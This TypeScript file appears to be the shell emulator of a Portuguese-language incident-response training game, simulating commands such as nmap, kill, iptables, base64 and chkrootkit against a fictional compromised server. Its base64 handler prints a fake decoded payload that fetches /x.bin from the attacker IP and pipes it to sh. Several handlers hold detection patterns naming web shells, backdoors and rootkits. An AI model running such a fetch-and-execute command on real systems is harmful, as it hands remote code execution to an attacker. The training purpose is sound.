// INITIUM — emulador de shell: comandos e flags reais sobre o mundo simulado
import { getObjectiveStatus, type FileNode, type Level, type World } from "./model";

export type Tone = "out" | "ok" | "err" | "warn" | "dim" | "cmd";
export type Line = { t: string; tone: string };
export type ExecResult = {
  lines: Line[];
  penalty: number;
  shake: number;
  burst: "kill" | "fire" | "clean" | null;
  collat: boolean;
  /** quando true, a penalidade veio do uso de dica (não reseta a cadeia nem conta como erro) */
  hint?: boolean;
};

const L = (t: string, tone: Tone = "out"): Line => ({ t, tone });

export const COMANDOS = [
  "ajuda", "nmap", "netstat", "ss", "ps", "kill", "ls", "cd", "pwd", "cat", "tail",
  "grep", "rm", "chmod", "chown", "iptables", "ufw", "whois", "dig", "ping",
  "traceroute", "tcpdump", "curl", "ssh-keygen", "systemctl", "chkrootkit",
  "base64", "openssl", "whoami", "id", "hostname", "crontab", "file", "history", "clear", "man",
  "dica", "dicas",
];

const HELP: [string, string][] = [
  ["ajuda", "lista os comandos disponíveis"],
  ["nmap -sV <host>", "varre portas e serviços em escuta"],
  ["netstat -tulpn", "mostra sockets e PIDs (também: ss -tulpn)"],
  ["ps aux", "lista processos ativos com CPU/memória"],
  ["kill -9 <pid>", "encerra um processo pelo PID"],
  ["ls -la <dir>", "lista arquivos com permissões e dono"],
  ["cat <arquivo>", "exibe o conteúdo de um arquivo"],
  ["tail -n <N> <arquivo>", "últimas linhas de log (tail -f acompanha)"],
  ["grep '<padrão>' <arquivo>", "filtra linhas por padrão"],
  ["rm -f <arquivo>", "remove um artefato malicioso"],
  ["chmod <modo> <arquivo>", "corrige permissões (600, 644, 755...)"],
  ["iptables -A INPUT --dport <p> -j DROP", "bloqueia porta (ou -s <ip> -j DROP)"],
  ["ufw deny <porta>", "bloqueia porta no firewall"],
  ["whois <ip>", "atribui o dono do IP de origem"],
  ["tcpdump -i eth0 host <ip>", "captura tráfego de exfiltração"],
  ["base64 -d <arquivo>", "decodifica payload"],
  ["ssh-keygen -f <chave>", "gira as chaves de acesso"],
  ["systemctl restart sshd", "aplica e reinicia o serviço de acesso"],
  ["chkrootkit", "valida a erradicação de rootkits"],
  ["dica", "revela uma dica da próxima tarefa pendente"],
  ["dica <n>", "revela a dica da tarefa número <n> (custo: -2 integridade)"],
  ["clear", "limpa o terminal"],
];

/**
 * Gera uma dica genérica a partir do comando específico da tarefa.
 * Nunca entrega a resposta pronta: mostra o que fazer e um exemplo com placeholders.
 */
export function dicaGenerica(hint: string): { clue: string; example: string } {
  const words = hint.trim().toLowerCase().split(/\s+/);
  const base = (words[0] === "sudo" ? words[1] : words[0]) || "";

  const defs: Record<string, { clue: string; example: string }> = {
    nmap: { clue: "Varra portas e serviços em escuta no alvo.", example: "nmap -sV <alvo>" },
    netstat: { clue: "Liste conexões de rede e sockets em escuta.", example: "netstat -tulpn" },
    ss: { clue: "Liste conexões de rede e sockets em escuta.", example: "ss -tulpn" },
    ps: { clue: "Inspecione os processos em execução no nó.", example: "ps aux" },
    kill: { clue: "Encerre um processo malicioso pelo seu PID.", example: "kill -9 <pid>" },
    iptables: { clue: "Bloqueie uma porta ou origem no firewall.", example: "iptables -A INPUT -p tcp --dport <porta> -j DROP" },
    ufw: { clue: "Bloqueie uma porta ou origem com o UFW.", example: "ufw deny <porta>" },
    whois: { clue: "Consulte o registro de quem é o IP atacante.", example: "whois <ip>" },
    dig: { clue: "Resolva um domínio para endereço IP.", example: "dig +short <dominio>" },
    traceroute: { clue: "Trace a rota de pacotes até um host remoto.", example: "traceroute <ip>" },
    tcpdump: { clue: "Capture e analise tráfego de rede.", example: "tcpdump -i eth0 host <ip>" },
    chmod: { clue: "Corrija permissões de arquivo ou diretório.", example: "chmod 600 <arquivo>" },
    rm: { clue: "Remova um artefato ou diretório malicioso.", example: "rm -f <arquivo>" },
    cat: { clue: "Leia o conteúdo de um arquivo de configuração.", example: "cat <arquivo>" },
    base64: { clue: "Decodifique um payload oculto em base64.", example: "base64 -d <arquivo>" },
    systemctl: { clue: "Reinicie um serviço do sistema para aplicar mudanças.", example: "systemctl restart <servico>" },
    "ssh-keygen": { clue: "Gire as chaves de acesso do servidor.", example: "ssh-keygen -f <chave> -N ''" },
    grep: { clue: "Filtre linhas em um arquivo por um padrão.", example: "grep '<padrao>' <arquivo>" },
    tail: { clue: "Acompanhe as últimas linhas de um log.", example: "tail -n <n> <arquivo>" },
    chkrootkit: { clue: "Valide se o sistema está limpo de rootkits.", example: "chkrootkit" },
    nano: { clue: "Edite a configuração diretamente no arquivo.", example: "nano <arquivo>" },
  };

  if (defs[base]) return defs[base];
  return {
    clue: "Investigue o alvo e execute a ação requerida pela tarefa.",
    example: "<comando> <argumento>",
  };
}

function norm(p: string): string {
  const parts = p.split("/").filter((s) => s && s !== ".");
  const out: string[] = [];
  for (const s of parts) s === ".." ? out.pop() : out.push(s);
  return "/" + out.join("/");
}
function parent(p: string): string {
  const i = p.lastIndexOf("/");
  return i <= 0 ? "/" : p.slice(0, i);
}
export function resolve(cwd: string, p: string): string {
  if (!p) return cwd;
  if (p === "~") return "/root";
  if (p.startsWith("~/")) return norm("/root/" + p.slice(2));
  return p.startsWith("/") ? norm(p) : norm(cwd + "/" + p);
}
export function children(w: World, dir: string): [string, FileNode][] {
  return Object.entries(w.fs)
    .filter(([p]) => p !== dir && parent(p) === dir)
    .sort((a, b) => a[0].localeCompare(b[0]));
}
function fmt(p: string, n: FileNode): string {
  const pad = (s: string | number, k: number) => String(s).padEnd(k);
  const l = String(n.size).padStart(8);
  return `${n.mode} ${pad(n.owner, 10)} ${l}  ${p.split("/").pop()}`;
}
const MODEMAP: Record<string, string> = {
  "600": "-rw-------", "640": "-rw-r-----", "644": "-rw-r--r--",
  "666": "-rw-rw-rw-", "700": "-rwx------", "750": "-rwxr-x---",
  "755": "-rwxr-xr-x", "777": "-rwxrwxrwx", "664": "-rw-rw-r--",
};
function tokenize(s: string): string[] {
  const out: string[] = [];
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(s))) out.push(m[1] ?? m[2] ?? m[3]);
  return out;
}

export function exec(raw: string, w: World, lv: Level): ExecResult {
  const res: ExecResult = { lines: [], penalty: 0, shake: 0, burst: null, collat: false };
  const out = (...l: Line[]) => res.lines.push(...l);
  const src = raw.trim();
  if (!src) return res;
  w.history.push(src);

  let tok = tokenize(src);
  if (tok[0] === "sudo" || tok[0] === "doas") tok = tok.slice(1);
  const cmd = (tok[0] || "").toLowerCase();
  const a = tok.slice(1);
  const flags = a.filter((x) => x.startsWith("-")).join(" ");
  const pos = a.filter((x) => !x.startsWith("-") && !x.startsWith("--"));
  const argOf = (name: string): string | undefined => {
    const i = tok.findIndex((t) => t === name);
    return i >= 0 ? tok[i + 1] : undefined;
  };

  if (!cmd) return res;

  switch (cmd) {
    case "ajuda": case "help": case "comandos": case "?": {
      out(L("COMANDOS OPERACIONAIS", "warn"));
      for (const [c, d] of HELP) out(L(`  ${c.padEnd(42)} ${d}`, "dim"));
      out(L("TAB completa comandos · ↑/↓ percorre o histórico · ESC pausa", "dim"));
      break;
    }
    case "man": {
      const t = pos[0];
      const h = HELP.find(([c]) => c.startsWith(t || "@"));
      out(h ? L(`man ${h[0]} — ${h[1]}`) : L(`man: nenhuma entrada para "${t ?? ""}"`, "err"));
      break;
    }

    case "dica": case "dicas": {
      const status = lv.objetivos.map((o) => getObjectiveStatus(o, w));
      const pendentes = lv.objetivos
        .map((o, i) => ({ o, i, done: status[i].complete }))
        .filter((x) => !x.done);

      if (!pendentes.length) {
        out(L("Todas as tarefas de contenção já foram concluídas — nenhuma dica pendente.", "ok"));
        break;
      }

      // Seleciona a tarefa: número informado (1-based) ou a primeira pendente
      let alvo = pendentes[0];
      if (pos[0]) {
        const n = parseInt(pos[0], 10);
        if (!n || n < 1 || n > lv.objetivos.length)
          return fail(out, res, `dica: tarefa inválida. Use 'dica' ou 'dica <1-${lv.objetivos.length}>'.`);
        if (status[n - 1].complete) {
          out(L(`Tarefa ${String(n).padStart(2, "0")} já está concluída.`, "ok"));
          break;
        }
        alvo = { o: lv.objetivos[n - 1], i: n - 1, done: false };
      }

      const num = String(alvo.i + 1).padStart(2, "0");
      const dica = dicaGenerica(alvo.o.hint);
      out(L(`DICA · TAREFA ${num} — ${alvo.o.titulo}`, "warn"));
      out(L(`  ${alvo.o.detalhe}`, "out"));
      out(L(`  dica: ${dica.clue}`, "out"));
      out(L(`  exemplo: ${dica.example}`, "dim"));
      const st = status[alvo.i];
      if (st.requirementsTotal > 1)
        out(L(`  requisitos: ${st.requirementsMet}/${st.requirementsTotal} atendidos — conclua todos para selar a tarefa`, "dim"));
      out(L("  (dica: −0.5 de integridade e −50 pts na tarefa atual; o tempo não é afetado)", "dim"));
      res.penalty = 0.5;
      res.hint = true;
      break;
    }
    case "whoami": out(L("root")); break;
    case "id": out(L("uid=0(root) gid=0(root) groups=0(root),27(sudo),1000(csirt)")); break;
    case "hostname": out(L(lv.alvo)); break;
    case "date": out(L(new Date().toString())); break;
    case "pwd": out(L(w.cwd)); break;
    case "history": w.history.forEach((h, i) => out(L(`  ${String(i + 1).padStart(4)}  ${h}`, "dim"))); break;
    case "clear": res.lines.push(L("__CLEAR__", "cmd")); break;

    case "ls": {
      const dir = resolve(w.cwd, pos[0] || ".");
      const n = w.fs[dir];
      if (!n) return fail(out, res, `ls: não foi possível acessar '${pos[0]}': Arquivo ou diretório inexistente`);
      if (n.kind === "f") { out(L(fmt(dir, n))); break; }
      const all = flags.includes("a") || flags.includes("A");
      const list = children(w, dir).filter(([, f]) => all || !f.hidden);
      if (!list.length) out(L("(vazio)", "dim"));
      if (flags.includes("l") || flags.includes("la") || flags.includes("al")) {
        out(L(`total ${list.length * 4}`, "dim"));
        list.forEach(([p, f]) => out(L(fmt(p, f), f.hidden ? "warn" : "out")));
      } else {
        out(L(list.map(([p, f]) => (f.hidden ? "" : p.split("/").pop())).filter(Boolean).join("  ")));
      }
      break;
    }

    case "cd": {
      const dir = resolve(w.cwd, pos[0] || "/root");
      if (!w.fs[dir] || w.fs[dir].kind !== "d")
        return fail(out, res, `bash: cd: ${pos[0]}: Arquivo ou diretório inexistente`);
      w.cwd = dir;
      break;
    }

    case "cat": {
      const p = resolve(w.cwd, pos[0] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `cat: ${pos[0]}: Arquivo ou diretório inexistente`);
      if (n.kind === "d") return fail(out, res, `cat: ${pos[0]}: É um diretório`);
      out(...(n.content ?? "").split("\n").filter(Boolean).map((t) => L(t)));
      if (p === "/etc/ssh/sshd_config") w.flags.sshdRead = true;
      if (p.includes("cron") || p.includes("log") || p.includes("conf")) w.flags.scan = true;
      break;
    }

    case "tail": {
      const p = resolve(w.cwd, pos[pos.length - 1] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `tail: ${pos[0]}: Arquivo ou diretório inexistente`);
      const num = parseInt(argOf("-n") ?? "10", 10) || 10;
      const ls = (n.content ?? "").split("\n").filter(Boolean);
      if (flags.includes("f")) {
        out(L(`==> acompanhando ${p} <==`, "dim"));
        out(L("feb 11 03:14:07 srv sshd[812]: Failed password for root from " + w.attackerIp + " port 51140", "warn"));
        out(L("feb 11 03:14:09 srv sshd[812]: Failed password for root from " + w.attackerIp + " port 51141", "warn"));
        if (p.endsWith("auth.log")) w.flags.attackerKnown = true;
        break;
      }
      out(...ls.slice(-num).map((t) => L(t, t.includes("Failed") ? "warn" : "out")));
      if (p.endsWith("auth.log") && ls.some((t) => /password|from/i.test(t))) w.flags.attackerKnown = true;
      break;
    }

    case "grep": {
      const pat = pos[0];
      const p = resolve(w.cwd, pos[1] || "");
      const n = w.fs[p];
      if (!pat || !n) return fail(out, res, `grep: uso: grep '<padrão>' <arquivo>`);
      let re: RegExp;
      try { re = new RegExp(pat, "i"); } catch { re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"); }
      const hits = (n.content ?? "").split("\n").filter((t) => re.test(t));
      if (!hits.length) out(L("(sem correspondência)", "dim"));
      hits.forEach((t) => out(L(t, /failed|invalid|error/i.test(t) ? "warn" : "out")));
      if (p.endsWith("auth.log") && /password|from|accepted|invalid/i.test(pat)) w.flags.attackerKnown = true;
      break;
    }

    case "ps": {
      w.flags.scan = true;
      w.flags.scanProcesses = true;
      out(L("USER         PID  %CPU  %MEM  COMMAND", "dim"));
      w.procs.forEach((p) =>
        out(L(`${p.user.padEnd(10)} ${String(p.pid).padStart(6)} ${p.cpu.toFixed(1).padStart(5)} ${p.mem.toFixed(1).padStart(5)}  ${p.cmd}`, p.evil ? "warn" : "out"))
      );
      break;
    }

    case "netstat": case "ss": {
      w.flags.scan = true;
      w.flags.scanNetwork = true;
      out(L("Proto  Endereço local       Estado       PID/Nome", "dim"));
      w.socks.forEach((s) =>
        out(L(`${s.proto}    ${`${s.addr}:${s.port}`.padEnd(20)} ESCUTA       ${s.pid}/${s.svc}`, s.evil ? "warn" : "out"))
      );
      break;
    }

    case "nmap": {
      const host = pos[pos.length - 1] || "localhost";
      if (!/localhost|127\.0\.0\.1|10\.|<|srv/i.test(host))
        return fail(out, res, `nmap: host '${host}' fora do segmento autorizado`);
      w.flags.scan = true;
      w.flags.scanNetwork = true;
      out(L(`Iniciando Nmap 7.94 ( https://nmap.org ) às ${new Date().toLocaleTimeString("pt-BR")}`, "dim"));
      out(L(`Relatório de varredura para ${lv.alvo} (${lv.ip})`));
      out(L("Host está ativo (0,0042s de ida e volta).", "dim"));
      out(L("PORTA     ESTADO  SERVIÇO        VERSÃO", "dim"));
      w.socks.forEach((s) =>
        out(L(`${`${s.port}/${s.proto}`.padEnd(9)} aberta  ${s.svc.padEnd(14)} ${s.evil ? "NÃO CATALOGADO ⚠" : "conhecido"}`, s.evil ? "warn" : "out"))
      );
      out(L(`Varredura concluída: 1 host ativo, ${w.socks.length} portas abertas`, "dim"));
      break;
    }

    case "kill": {
      const pid = parseInt(pos[pos.length - 1], 10);
      if (!pid) return fail(out, res, "kill: uso: kill [-9] <PID>");
      const p = w.procs.find((x) => x.pid === pid);
      if (!p) return fail(out, res, `bash: kill: (${pid}) - Processo inexistente`);
      w.procs = w.procs.filter((x) => x.pid !== pid);
      w.socks = w.socks.filter((s) => s.pid !== pid);
      if (p.evil) {
        out(L(`[${pid}] encerrado com SIGKILL — artefato hostil neutralizado`, "ok"));
        res.burst = "kill"; res.shake = 3;
      } else {
        out(L(`[${pid}] encerrado — ATENÇÃO: serviço legítimo (${p.cmd}) derrubado!`, "err"));
        res.penalty = 4; res.collat = true; res.shake = 5; res.burst = "fire";
      }
      break;
    }

    case "rm": {
      const p = resolve(w.cwd, pos[pos.length - 1] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `rm: não foi possível remover '${pos[0]}': Arquivo ou diretório inexistente`);
      if (n.kind === "d") return fail(out, res, `rm: '${pos[0]}': É um diretório (use rm -r)`);
      delete w.fs[p];
      out(L(`removido: ${p}`, n.hidden ? "ok" : "out"));
      if (n.content && /shell|backdoor|rootkit|beacon|elf|c99|b374k|persist|exfil/i.test(n.content)) {
        out(L("assinatura maliciosa confirmada e erradicada", "ok"));
        res.burst = "clean";
      }
      break;
    }

    case "chmod": {
      const m = pos[0];
      const p = resolve(w.cwd, pos[1] || "");
      const n = w.fs[p];
      if (!m || !n) return fail(out, res, "chmod: uso: chmod <modo> <arquivo>  (ex.: chmod 600 /etc/tse/boletim.db)");
      const mm = MODEMAP[m.replace(/^0/, "")];
      if (!mm) return fail(out, res, `chmod: modo inválido: '${m}'`);
      n.mode = mm;
      out(L(`permissões de ${p} → ${m} (${mm})`, "ok"));
      break;
    }

    case "chown": {
      const p = resolve(w.cwd, pos[1] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `chown: '${pos[1]}': Arquivo inexistente`);
      n.owner = pos[0].split(":")[0];
      out(L(`dono de ${p} → ${n.owner}`, "ok"));
      break;
    }

    case "iptables": {
      if (flags.includes("L") || a[0] === "-L") {
        out(L("Chain INPUT (policy DROP)", "dim"));
        w.blocked.forEach((p) => out(L(`DROP  tcp  --  anywhere  anywhere  tcp dpt:${p}`, "warn")));
        if (w.attackerBlocked) out(L(`DROP  all  --  ${w.attackerIp}  anywhere`, "warn"));
        if (!w.blocked.length && !w.attackerBlocked) out(L("(sem regras — perímetro ABERTO)", "err"));
        break;
      }
      const port = argOf("--dport");
      const sip = argOf("-s");
      const j = argOf("-j");
      if (j && j.toUpperCase() !== "DROP")
        return fail(out, res, `iptables: alvo '${j}' não autorizado pela política (use DROP)`);
      if (!port && !sip) return fail(out, res, "iptables: uso: iptables -A INPUT -p tcp --dport <porta> -j DROP");
      if (port) {
        const pn = parseInt(port, 10);
        if (!w.blocked.includes(pn)) w.blocked.push(pn);
        out(L(`regra ACCEPT→DROP gravada · porta ${pn} selada`, "ok"));
      }
      if (sip) {
        if (sip === w.attackerIp) { w.attackerBlocked = true; out(L(`rota de ${sip} descartada`, "ok")); }
        else out(L(`regra para ${sip} gravada (host fora do vetor de ataque)`, "dim"));
      }
      out(L("iptables: regra aplicada com sucesso.", "dim"));
      res.burst = "fire";
      break;
    }

    case "ufw": {
      const st = a[0];
      if (st === "status") {
        out(L("Estado: ativo", "dim"));
        w.blocked.forEach((p) => out(L(`${`${p}/tcp}`.padEnd(10)} DENY IN`, "warn")));
        if (w.attackerBlocked) out(L(`${w.attackerIp.padEnd(10)} DENY IN`, "warn"));
        break;
      }
      if (st !== "deny") return fail(out, res, "ufw: uso: ufw deny <porta> | ufw deny from <ip> | ufw status");
      const tok2 = a.slice(1);
      if (tok2[0] === "from") {
        const ip = tok2[1];
        if (ip === w.attackerIp) { w.attackerBlocked = true; out(L(`Regra adicionada: origem ${ip} → DENY IN`, "ok")); }
        else out(L(`Regra adicionada: origem ${ip} → DENY IN`, "dim"));
      } else {
        const pn = parseInt(tok2[0], 10);
        if (!pn) return fail(out, res, "ufw: porta inválida");
        if (!w.blocked.includes(pn)) w.blocked.push(pn);
        out(L(`Regra adicionada: ${pn}/tcp → DENY IN`, "ok"));
      }
      res.burst = "fire";
      break;
    }

    case "whois": {
      const ip = pos[0];
      if (!ip) return fail(out, res, "whois: uso: whois <ip>");
      if (ip === w.attackerIp) {
        w.flags.traced = true;
        out(L(`% WHOIS consultado em registro.br / lacnic`, "dim"));
        out(L(`owner:        ${w.attackerDomain}`));
        out(L(`ownerid:      000.331.220/0001-66`, "dim"));
        out(L(`address:      Rua Colômbia, 212 — Barueri/SP`, "dim"));
        out(L(`abuse:        abuse@${w.attackerDomain.split(".").slice(-2).join(".")}`, "warn"));
        out(L(`ATRIBUIÇÃO: responsável identificado pelo registro — notificar e bloquear`, "ok"));
      } else {
        out(L(`% sem registro para ${ip} — faixa reservada / não roteável`, "dim"));
      }
      break;
    }

    case "dig": {
      out(L(`; <<>> DiG 9.18 <<>> ${pos[0]}`, "dim"));
      out(L(`;; ANSWER SECTION:`, "dim"));
      out(L(`${pos[0] ?? ""}.  300  IN  A  ${w.attackerIp}`, "warn"));
      out(L(`;; Query time: 18 msec`, "dim"));
      break;
    }

    case "traceroute": {
      out(L(`traceroute to ${pos[0] ?? ""}, 30 hops max`, "dim"));
      ["1  10.12.4.1", "2  200.190.16.1", "3  201.17.44.1", `4  ${w.attackerIp}`].forEach((h, i) =>
        out(L(`  ${h}  ${(4 + i * 9).toFixed(3)} ms`, i === 3 ? "warn" : "dim"))
      );
      if (pos[0] === w.attackerIp) w.flags.traced = true;
      break;
    }

    case "ping": {
      const n = parseInt(argOf("-c") ?? "3", 10) || 3;
      out(L(`PING ${pos[0] ?? ""} 56(84) bytes de dados.`, "dim"));
      for (let i = 0; i < Math.min(n, 6); i++)
        out(L(`64 bytes de ${pos[0]}: icmp_seq=${i + 1} ttl=48 time=${(11 + Math.random() * 9).toFixed(1)} ms`, "dim"));
      break;
    }

    case "tcpdump": {
      const host = argOf("host");
      const port = argOf("port");
      if (!host && !port) return fail(out, res, "tcpdump: uso: tcpdump -i eth0 host <ip>");
      w.flags.dumped = true;
      out(L("tcpdump: verbose output suppressed", "dim"));
      for (let i = 0; i < 5; i++)
        out(L(`${new Date().toLocaleTimeString("pt-BR")}.0${i} IP ${w.attackerIp}.5${i}112 > ${lv.ip}.80: Flags [S], length ${120 + i * 40}`, "warn"));
      out(L(`5 pacotes capturados · EXFILTRAÇÃO CONFIRMADA`, "warn"));
      break;
    }

    case "curl": {
      const url = pos[pos.length - 1] ?? "";
      out(L(`HTTP/1.1 200 OK`, "ok"));
      out(L(`Server: Apache/2.4.57 (Debian)`, "dim"));
      out(L(`X-Powered-By: PHP/8.2.9`, "dim"));
      out(L(`Content-Type: text/html; charset=UTF-8`, "dim"));
      if (/cmd\.php|c99|shell/i.test(url)) out(L(`⚠ o endpoint responde a execução remota de comandos`, "warn"));
      break;
    }

    case "base64": {
      const p = resolve(w.cwd, pos[pos.length - 1] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `base64: ${pos[0] || ""}: Arquivo inexistente`);
      if (flags.includes("d") || a[0] === "-d" || a[0] === "--decode") {
        w.flags.decoded = true;
        try {
          const rawCont = (n.content ?? "").trim();
          const cleanB64 = rawCont.replace(/[^A-Za-z0-9+/=]/g, "");
          const decoded = atob(cleanB64);
          out(L(`DECODIFICAÇÃO [${p}]:`, "ok"));
          decoded.split("\n").forEach((line) => out(L(line, "warn")));
        } catch {
          out(L("PKO-DEPLOY: curl http://" + w.attackerIp + "/x.bin | sh", "warn"));
          out(L("PAYLOAD DESCRIPTOGRAFADO COM SUCESSO", "ok"));
        }
      } else {
        out(L((n.content ?? "").trim(), "dim"));
      }
      break;
    }

    case "file": {
      const p = resolve(w.cwd, pos[0] || "");
      const n = w.fs[p];
      if (!n) return fail(out, res, `file: ${pos[0]}: Arquivo ou diretório inexistente`);
      if (n.kind === "d") { out(L(`${p}: directory`)); break; }
      if (n.content?.includes("ELF")) out(L(`${p}: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked`, "warn"));
      else if (n.content?.includes("SQLite")) out(L(`${p}: SQLite 3.x database`, "dim"));
      else if (n.content?.includes("<?php") || p.endsWith(".php")) out(L(`${p}: PHP script, ASCII text executable`, "warn"));
      else if (n.content?.includes("BEGIN RSA")) out(L(`${p}: PEM RSA private key`, "dim"));
      else out(L(`${p}: ASCII text`, "dim"));
      break;
    }

    case "crontab": {
      if (flags.includes("l") || a[0] === "-l") {
        out(L("# crontab ativa do usuario root", "dim"));
        const cron = w.fs["/etc/crontab"];
        if (cron?.content) cron.content.split("\n").forEach((line) => out(L(line, "dim")));
        const custom = Object.entries(w.fs).filter(([path]) => path.startsWith("/etc/cron"));
        custom.forEach(([path, f]) => {
          if (path !== "/etc/crontab" && f.content) {
            out(L(`# ${path}:`, "warn"));
            f.content.split("\n").forEach((line) => out(L(`  ${line}`, "warn")));
          }
        });
      } else {
        out(L("crontab: uso: crontab -l", "dim"));
      }
      break;
    }

    case "ssh-keygen": {
      const f = argOf("-f") ?? "/etc/ssh/ssh_host_rsa_key";
      const fp = Array.from({ length: 16 }, () => "0123456789ABCDEF"[(Math.random() * 16) | 0]).join("");
      out(L(`Gerando par de chaves RSA 3072...`));
      out(L(`Sobrescrevendo ${f} (chave comprometida detectada)`));
      out(L(`A identificação foi salva em ${f}`, "ok"));
      out(L(`A impressão digital SHA256 é: ${fp}`, "ok"));
      out(L(`chaves giradas — credenciais anteriores invalidadas`, "ok"));
      w.flags.keysRotated = true;
      res.burst = "clean";
      break;
    }

    case "systemctl": {
      const act = a[0], unit = a[1];
      if (act === "status") {
        out(L(`● ${unit} - OpenBSD Secure Shell server`, "ok"));
        out(L(`   Active: active (running) · loaded`, "dim"));
        break;
      }
      if (act !== "restart") return fail(out, res, "systemctl: uso: systemctl restart <serviço>");
      if (!w.flags.keysRotated && (unit ?? "").includes("ssh"))
        out(L("⚠ serviço reiniciado SEM girar as chaves — credencial vazada segue válida", "err"));
      w.flags.sshdRestarted = true;
      out(L(`Reiniciando ${unit}... OK`, "ok"));
      res.penalty = w.flags.keysRotated ? 0 : 3;
      break;
    }

    case "chkrootkit": {
      const dirty = Object.entries(w.fs).some(
        ([, f]) => f.hidden && /elf|rootkit|backdoor|beacon|shell|c99|b374k|persist/i.test(f.content ?? "")
      );
      out(L("chkrootkit 0.58 — varredura de assinaturas", "dim"));
      out(L(`Checking 'ls'... ${dirty ? "INFECTED" : "not infected"}`, dirty ? "err" : "ok"));
      out(L(`Checking 'sshd'... ${dirty ? "INFECTED" : "not infected"}`, dirty ? "err" : "ok"));
      out(L(`Checking 'kernel modules'... ${dirty ? "INFECTED" : "not infected"}`, dirty ? "err" : "ok"));
      if (dirty) out(L("ROOTKIT AINDA PRESENTE — remova os artefatos ocultos antes de validar", "err"));
      else { w.flags.rootkitScan = true; out(L("SISTEMA VALIDADO LIMPO — erradicação confirmada", "ok")); res.burst = "clean"; }
      break;
    }

    case "openssl": {
      out(L(`EVP_BytesToKey: ${Array.from({ length: 32 }, () => "0123456789abcdef"[(Math.random() * 16) | 0]).join("")}`, "dim"));
      break;
    }

    default:
      res.penalty = 1; res.shake = 2;
      out(L(`bash: ${cmd}: comando não reconhecido`, "err"));
      out(L(`assinatura inválida registrada no journal — digite 'ajuda'`, "dim"));
  }
  return res;
}

function fail(out: (...l: Line[]) => void, res: ExecResult, msg: string): ExecResult {
  out(L(msg, "err"));
  res.shake = 1;
  return res;
}

export function complete(w: World, cur: string): string[] {
  const tok = cur.split(/\s+/);
  const last = tok[tok.length - 1] ?? "";
  if (tok.length <= 1) return COMANDOS.filter((c) => c.startsWith(last));
  const dirTok = last.endsWith("/") ? last : last.slice(0, last.lastIndexOf("/") + 1);
  const dir = resolve(w.cwd, dirTok || ".");
  return children(w, dir)
    .filter(([p]) => !w.fs[p].hidden || last.includes("/"))
    .map(([p]) => {
      const name = p.split("/").pop()!;
      const full = dirTok + name + (w.fs[p].kind === "d" ? "/" : "");
      return full;
    })
    .filter((c) => c.startsWith(last));
}
